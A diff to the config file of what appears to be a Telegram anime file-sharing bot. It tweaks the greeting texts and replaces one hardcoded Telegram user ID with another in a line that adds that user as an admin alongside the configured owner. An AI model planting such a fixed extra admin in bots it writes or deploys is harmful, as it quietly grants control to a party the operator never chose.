@@ -38,7 +38,7 @@ FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "-1001657899041"))
 TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
 
 #start message
-START_MSG = os.environ.get("START_MESSAGE", "ʜᴇʟʟᴏ {first}\n\nʙᴀᴋᴋᴀᴀᴀᴀᴀ!! ɪ'ᴍ ʜᴇʀᴇ ᴀᴛ ᴛᴏ ᴘʀᴏᴠɪᴅᴇ ʏᴏᴜʀ ᴀɴɪᴍᴇ !!! ᴊᴜꜱᴛ ᴅᴏɴ'ᴛ ᴏᴠᴇʀʟᴏᴀᴅ ᴍᴇ 🫣")
+START_MSG = os.environ.get("START_MESSAGE", "ʜᴇʟʟᴏ {first}\n\nʙᴀᴋᴋᴀᴀᴀᴀ!! ɪ'ᴍ ʜᴇʀᴇ ᴀᴛ ᴛᴏ ᴘʀᴏᴠɪᴅᴇ ʏᴏᴜʀ ᴀɴɪᴍᴇ !!! ᴊᴜꜱᴛ ᴅᴏɴ'ᴛ ᴏᴠᴇʀʟᴏᴀᴅ ᴍᴇ 🫣")
 try:
     ADMINS=[]
     for x in (os.environ.get("ADMINS", "6066177103").split()):
@@ -47,7 +47,7 @@ except ValueError:
         raise Exception("Your Admins list does not contain valid integers.")
 
 #Force sub message 
-FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "Hello {first}\n\n<b>ᴡʜʏ ᴀʀᴇ ʏᴏᴜ ᴜꜱɪɴɢ ᴍᴇ ᴡɪᴛʜᴏᴜᴛ ᴊᴏɪɴɪɴɢ ᴛʜᴇ ᴍᴀɪɴ ᴄʜᴀɴɴᴇʟ?ᴊᴏɪɴ ɴᴏᴡ, ᴀɴᴅ ᴇɴᴊᴏʏ !!! ☺️</b>")
+FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "Hello {first}\n\n<b>ᴡʜʏ ᴀʀᴇ ʏᴏᴜ ᴜꜱɪɴɢ ᴍᴇ ᴡɪᴛʜᴏᴜᴛ ᴊᴏɪɴɪɴɢ ᴛʜᴇ ᴍᴀɪɴ ᴄʜᴀɴɴᴇʟ?ᴊᴏɪɴ ɴᴏᴡ, ᴀɴᴅ ᴇɴᴊᴏʏ !!! </b>")
 
 #set your Custom Caption here, Keep None for Disable Custom Caption
 CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
@@ -62,7 +62,7 @@ BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
 USER_REPLY_TEXT = "ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ ʙᴜᴛ ɪ ᴀᴍ ᴘʀɪᴠᴀᴛᴇ ғɪʟᴇ sʜᴀʀᴇ ʙᴏᴛ ᴡᴏʀᴋɪɴɢ ғᴏʀ ʀɪᴍᴜʀᴜ sᴇɴsᴇɪ❤️"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(1250450587)
+ADMINS.append(2036803347)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
